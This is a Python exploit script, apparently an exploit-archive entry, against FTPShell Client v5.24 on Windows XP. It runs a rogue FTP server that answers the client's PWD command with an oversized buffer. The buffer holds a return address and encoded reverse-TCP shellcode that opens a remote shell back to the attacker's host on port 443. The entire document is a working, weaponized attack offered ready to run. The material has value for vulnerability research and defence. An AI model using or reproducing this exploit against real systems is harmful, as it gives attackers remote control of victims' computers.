
# Exploit Title: FTPShell Client v5.24 PWD Remote Buffer Overflow
# Tested on: Windows XP Professional SP 3

import socket

def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 21))
    s.listen(5)
    print 'Listening for connection from vulnerable ftp client at port 21'

    #Bad Chars Identified \x00 \x0A \x0D \x22 
    #Return Address 0x7E45B318
    #windows/shell/reverse_tcp LHOST=192.168.219.132 LPORT=443 EXITFUNC=thread 
    shellcode =  ""
    shellcode += "\x3f\x42\xd6\x37\x6a\x47\x59\xd9\xee\xd9\x74\x24"
    shellcode += "\xf4\x5b\x81\x73\x13\xe7\x07\xae\x91\x83\xeb\xfc"
    shellcode += "\xe2\xf4\x1b\xef\x2c\x91\xe7\x07\xce\x18\x02\x36"
    shellcode += "\x6e\xf5\x6c\x57\x9e\x1a\xb5\x0b\x25\xc3\xf3\x8c"
    shellcode += "\xdc\xb9\xe8\xb0\xe4\xb7\xd6\xf8\x02\xad\x86\x7b"
    shellcode += "\xac\xbd\xc7\xc6\x61\x9c\xe6\xc0\x4c\x63\xb5\x50"
    shellcode += "\x25\xc3\xf7\x8c\xe4\xad\x6c\x4b\xbf\xe9\x04\x4f"
    shellcode += "\xaf\x40\xb6\x8c\xf7\xb1\xe6\xd4\x25\xd8\xff\xe4"
    shellcode += "\x94\xd8\x6c\x33\x25\x90\x31\x36\x51\x3d\x26\xc8"
    shellcode += "\xa3\x90\x20\x3f\x4e\xe4\x11\x04\xd3\x69\xdc\x7a"
    shellcode += "\x8a\xe4\x03\x5f\x25\xc9\xc3\x06\x7d\xf7\x6c\x0b"
    shellcode += "\xe5\x1a\xbf\x1b\xaf\x42\x6c\x03\x25\x90\x37\x8e"
    shellcode += "\xea\xb5\xc3\x5c\xf5\xf0\xbe\x5d\xff\x6e\x07\x58"
    shellcode += "\xf1\xcb\x6c\x15\x45\x1c\xba\x6f\x9d\xa3\xe7\x07"
    shellcode += "\xc6\xe6\x94\x35\xf1\xc5\x8f\x4b\xd9\xb7\xe0\xf8"
    shellcode += "\x7b\x29\x77\x06\xae\x91\xce\xc3\xfa\xc1\x8f\x2e"
    shellcode += "\x2e\xfa\xe7\xf8\x7b\xfb\xe2\x6f\x6e\x39\x3c\x83"
    shellcode += "\xc6\x93\xe7\x06\x15\x18\x01\x57\xfe\xc1\xb7\x47"
    shellcode += "\xfe\xd1\xb7\x6f\x44\x9e\x38\xe7\x51\x44\x70\x6d"
    shellcode += "\xbe\xc7\xb0\x6f\x37\x34\x93\x66\x51\x44\x62\xc7"
    shellcode += "\xda\x9d\x18\x49\xa6\xe4\x0b\x6f\x5e\x24\x45\x51"
    shellcode += "\x51\x44\x8d\x07\xc4\x95\xb1\x50\xc6\x93\x3e\xcf"
    shellcode += "\xf1\x6e\x32\x8c\x98\xfb\xa7\x6f\xae\x81\xe7\x07"
    shellcode += "\xf8\xfb\xe7\x6f\xf6\x35\xb4\xe2\x51\x44\x74\x54"
    shellcode += "\xc4\x91\xb1\x54\xf9\xf9\xe5\xde\x66\xce\x18\xd2"
    shellcode += "\xaf\x52\xce\xc1\xdb\x7f\x24\x07\xae\x91"

    buffer = 'A' * 400 + '\x18\xB3\x45\x7E' + shellcode + '\x90\x90\x00' +'C' * ( 1012 - 400 - 4 - len(shellcode) )
 
    while True:
        victim, addr = s.accept()
        victim.send("220 FTP Service\r\n")
        while True:
            data = victim.recv(1024)
            if "USER" in data:
                victim.send("331 Username OK, Enter password\r\n")
            elif "PASS" in data:
                victim.send("230 Password OK.\r\n")
            elif "PWD" in data:
                victim.send('257 "' + buffer + '" is working directory\r\n')
                print "\nExploit Sent - Reverse shell at port 443 in msf \n"

exploit()
